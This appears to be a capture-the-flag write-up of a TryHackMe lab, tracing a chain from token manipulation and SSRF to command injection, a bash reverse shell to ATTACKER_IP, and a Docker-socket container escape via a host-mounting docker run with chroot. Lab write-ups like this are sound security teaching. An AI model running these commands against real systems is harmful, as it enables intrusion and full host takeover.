# Review Shop - TryHackMe Lab

## Overview

This lab demonstrates several common web application vulnerabilities that lead to full system compromise.  
The attack chain includes:

- Authentication manipulation
- CSRF exploitation
- Server-Side Request Forgery (SSRF)
- Command execution
- Reverse shell
- Docker container escape

The final goal was to obtain root access on the host machine.

---

# 1. Initial Access

After logging into the application as a **moderator**, access to the settings panel revealed a feature to promote users to admin.

The application used a token system:

csrf_token_promote=ad148a3ca8bd0ef3b48c52454c493ec5

After decoding the token it was discovered that it represented the string **mod**.

By modifying the token to represent **admin** and re-encoding it, admin privileges were obtained.

---

# 2. Internal Network Discovery (SSRF)

An internal email revealed hidden endpoints:

/finance.php
/lottery.php

These endpoints were hosted on an internal network

The application allowed fetching internal URLs through a vulnerable parameter

Using this parameter, the internal **finance panel** was accessed.

---

# 3. Command Execution

The `finance.php` endpoint contained a command execution vulnerability which allowed arbitrary commands to run on the server.

A reverse shell was launched:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

This provided a shell on the target machine.

However, the shell was running inside a Docker container.

4. Identifying the Docker Environment

Indicators showed the system was containerized:
```
/.dockerenv
```
Filesystem layout also confirmed the environment:
```
/
bin -> usr/bin
lib -> usr/lib
```

5. Docker Escape

While enumerating the container, a critical file was discovered:
```
/var/run/docker.sock
```
This socket allows interaction with the Docker daemon running on the host.
```
srw-rw---- 1 root docker 0 /var/run/docker.sock
```
If a container can access this socket, it can control Docker on the host.

6. Exploiting Docker Socket

The running container list showed:
```
docker ps
```
Output:

CONTAINER ID   IMAGE           NAME
4f18a45cca05   phpvulnerable   phpVulnerable

A new container was launched while mounting the host filesystem:
```
docker run -i --rm -v /:/host phpvulnerable chroot /host sh
```
Explanation:

Option	Purpose

`-v /:/host`	Mounts the host filesystem
`chroot /host`	Changes root directory to the host
`phpvulnerable`	Uses existing local image

This effectively escaped the container and gave access to the host system.

7. Root Access

After escaping the container, the host filesystem became accessible.

Searching for the final flag:
```
ls /root
```
The root flag was found.

Attack Chain Summary

Token manipulation → Admin access
SSRF → Internal service discovery
Command injection → Reverse shell
Docker environment enumeration
Docker socket exploitation
Container escape
Root access on host

Key Takeaways

This lab demonstrates why exposing the Docker socket inside containers is extremely dangerous.

If `/var/run/docker.sock` is accessible, an attacker can:

Control Docker daemon
Spawn containers
Mount host filesystem
Escape container isolation
Gain full host access

Skills Demonstrated

Web exploitation
CSRF manipulation
SSRF exploitation
Reverse shells
Linux enumeration
Docker escape techniques




###################################################################

### Docker Escape Summary

After gaining a reverse shell through the vulnerable `finance.php` endpoint, the shell was running inside a Docker container.

To confirm the environment, basic enumeration commands were executed.

First, the filesystem was inspected:

ls -la /

This revealed the presence of the `.dockerenv` file:

.dockerenv

The existence of this file indicates that the process is running inside a Docker container.

Next, system directories were explored to identify potential escape vectors.

ls -la /var/run

This revealed the Docker socket:

/var/run/docker.sock

To confirm its permissions:

ls -la /var/run/docker.sock

Output:

srw-rw---- 1 root docker 0 /var/run/docker.sock

The Docker socket allows communication with the Docker daemon running on the host system.  
If accessible, it can be abused to control Docker from inside the container.

To verify that Docker commands were available, the following command was executed:

docker ps

This listed the running containers and revealed the available image:

phpvulnerable

Since the host had no internet access, a new container was created using the existing local image while mounting the host filesystem:

docker run -i --rm -v /:/host phpvulnerable chroot /host sh

Explanation:

- `-v /:/host` mounts the host filesystem
- `chroot /host` changes the root directory to the host
- `phpvulnerable` uses a local Docker image already present on the system

After executing this command, the container isolation was bypassed and full access to the host filesystem was obtained.

The final flag was then located in the host system.
